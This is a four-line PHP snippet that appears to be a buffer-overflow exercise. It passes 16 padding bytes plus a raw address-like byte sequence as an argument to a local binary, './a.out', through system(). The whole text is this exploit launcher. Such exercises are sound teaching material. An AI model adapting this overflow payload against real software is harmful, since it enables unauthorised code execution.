$arg = "ABCDEFGHIJKLMNOP"."\x50\x10\x40";
$cmd = "./a.out ".$arg;

system($cmd);

